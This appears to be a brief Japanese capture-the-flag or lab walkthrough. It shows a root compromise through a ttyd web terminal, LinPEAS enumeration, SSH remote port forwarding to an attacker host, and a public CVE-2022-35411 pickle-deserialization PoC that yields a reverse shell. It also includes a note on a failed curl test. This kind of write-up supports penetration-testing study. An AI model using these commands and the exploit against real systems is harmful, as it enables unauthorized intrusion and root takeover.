- `ttyd`というWebターミナルから、ローカルサービスを列挙し、ローカルで動作しているrpc.pyのpickelによるデシリアライズ処理によって、任意のコードを実行する

1. port scanで8000のHTTPサービスにアクセスすると、webターミナルを確認できる

2. 中でLinPEASを実行すると、ポート127.0.0.1:65432が動作

3. SSHリモートポートフォワーディングを実施
```zsh
ssh -N -R 127.0.0.1:65432:127.0.0.1:65432 <attacker_username>@192.168.45.242
```

4. 以下のPoCを使用し、rootのリバースシェルを獲得
	- [CVE-2022-35411](https://github.com/fuzzlove/CVE-2022-35411/blob/main/rpc-exploit.py)
```sh
python rpc-exploit.py
```

# 少しつまずいたところ

- ここでつまずいたのが、このCVEの他のPoCで以下のコード実行があり、これを実行すると接続エラーが出ていた
```python
def main():
    exec_command('curl http://127.0.0.1:4321')
```

- ただし、ポートフォワーディングは以下のようにしていて
```zsh
ssh -N -R 127.0.0.1:4321:127.0.0.1:65432 <attacker_username>@192.168.45.242
```

- 攻撃者から以下のコマンドを実行すると正常にアクセスできていた
```zsh
curl http://127.0.0.1:4311
```

- 原因：PoCがRCEのものであり、コマンドがサーバーによって実行されるから
	- つまり、ターゲットがcurl ...4321とするけど、ターゲット上でローカルサービス4321が動作しているわけではないので、失敗していた